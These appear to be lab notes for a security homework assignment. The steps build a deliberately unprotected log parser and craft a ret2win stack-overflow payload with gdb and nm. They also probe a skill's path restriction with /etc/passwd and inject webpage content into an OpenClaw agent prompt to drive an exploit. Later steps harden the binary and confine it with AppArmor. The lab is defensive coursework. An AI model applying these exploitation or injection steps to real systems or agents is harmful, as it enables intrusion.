## Task 1

1. Compile vulnerable parser

```
gcc -O0 -g -fno-stack-protector -no-pie \
  -Wl,-z,noexecstack \
  -Wall -Wextra \
  -o legacy_log_parser legacy_log_parser.c

checksec --file=./legacy_log_parser | tee checksec-task1.txt
```

2. Find the offset and win() address
```
gdb -q -batch \
  -ex 'set pagination off' \
  -ex 'break vulnerable_copy' \
  -ex 'run normal.log' \
  -ex 'info frame' \
  -ex 'info registers rbp rsp' \
  -ex 'p/x &buf' \
  -ex 'p/x $rbp+8' \
  -ex 'p/d (long)($rbp+8) - (long)&buf' \
  -ex 'x/gx $rbp+8' \
  ./legacy_log_parser | tee gdb-offset.txt
```

3. Make exploit payload
```
OFFSET=$(
  gdb -q -batch \
    -ex 'break vulnerable_copy' \
    -ex 'run normal.log' \
    -ex 'printf "OFFSET=%ld\n", (long)($rbp+8)-(long)&buf' \
    ./legacy_log_parser 2>/dev/null |
  sed -n 's/^OFFSET=//p' | tail -1
)

WIN_ADDR=$(
  nm ./legacy_log_parser |
  awk '$3 == "win" {print "0x" $1}'
)

python3 make_payload.py "$OFFSET" "$WIN_ADDR"
```

4. Execute exploit
```
rm -f markers/ret2win.txt

./legacy_log_parser exploit.bin 2>&1 | tee exploit-output.txt

cat markers/ret2win.txt | tee marker-output.txt
```

5. Capture GDB Evidence
```
gdb -q -batch \
  -ex 'set pagination off' \
  -ex 'break win' \
  -ex 'run exploit.bin' \
  -ex 'bt' \
  -ex 'p/x $rip' \
  -ex 'continue' \
  ./legacy_log_parser | tee gdb-exploit.txt
```

## Task 2
1. Register OpenClaw skill
```
mkdir -p ~/.openclaw/workspace/skills

ln -sfn \
  ~/csce465-agentsec/hw3/skills/legacy-parser \
  ~/.openclaw/workspace/skills/legacy-parser

openclaw skills list
```

2. Test Path restriction and authorized payload
```
python3 skills/legacy-parser/run_parser.py /etc/passwd
```

```
python3 skills/legacy-parser/run_parser.py \
  ~/csce465-agentsec/hw3/inbox/exploit.bin \
  2>&1 | tee task2-evidence/skill-test.txt
```

3. Execute the agent experiment
Manually inject the webpage content as localhost is not accesible to OpenClaw

```
openclaw agent \
  --agent main \
  --message "$(cat task2-evidence/page-summary-prompt.txt)" \
  --verbose on \
  --json \
  > task2-evidence/agent-trace.json \
  2> task2-evidence/agent-stderr.txt
```

## Task 3

1. Compile Fixed Parser
```
gcc -O2 -g \
  -fstack-protector-strong \
  -D_FORTIFY_SOURCE=3 \
  -fPIE -pie \
  -Wl,-z,relro,-z,now \
  -Wl,-z,noexecstack \
  -Wall -Wextra -Werror \
  -o legacy_log_parser_fixed \
  legacy_log_parser_fixed.c
```

2. Run Tests
```
python3 test_fixed_parser.py | tee fixed-test-results.txt
```

3. Compare security protections
```
{
  echo "=== Vulnerable Parser ==="
  checksec --file=./legacy_log_parser

  echo
  echo "=== Fixed Parser ==="
  checksec --file=./legacy_log_parser_fixed
} | tee checksec-task3.txt
```

4. Verify original exploit is blocked
```
rm -f markers/ret2win.txt

./legacy_log_parser_fixed exploit.bin

test ! -e markers/ret2win.txt && \
  echo "PASS: Exploit did not execute win()"
```

# Task 4
1. Create user
```
sudo useradd --system --create-home --shell /usr/sbin/nologin agentlab
```

2. Setup Directories and Permissions
```
sudo install -d -m 755 /opt/agentsec
sudo install -d -m 750 -o root -g agentlab /opt/agentsec/payloads
sudo install -d -m 700 -o agentlab -g agentlab /opt/agentsec/markers

sudo install -m 755 task1/legacy_log_parser /opt/agentsec/legacy_log_parser
sudo install -m 640 -o root -g agentlab task1/exploit.bin /opt/agentsec/payloads/exploit.bin

echo "PROTECTED DECOY" | sudo tee /opt/agentsec/decoy.txt
sudo chown root:root /opt/agentsec/decoy.txt
sudo chmod 644 /opt/agentsec/decoy.txt
```

3. Load AppArmor Profile
```
sudo cp task4/opt.agentsec.legacy_log_parser /etc/apparmor.d/

sudo apparmor_parser -r /etc/apparmor.d/opt.agentsec.legacy_log_parser
sudo aa-enforce /etc/apparmor.d/opt.agentsec.legacy_log_parser

sudo aa-status
```

4. Run Exploit under confinement
```
cd task4
chmod +x run-task4.sh
./run-task4.sh
```

5. Verify AppArmor Blocked Exploit
```
sudo journalctl -k --since "10 minutes ago" --no-pager \
    | grep 'apparmor="DENIED"'
```
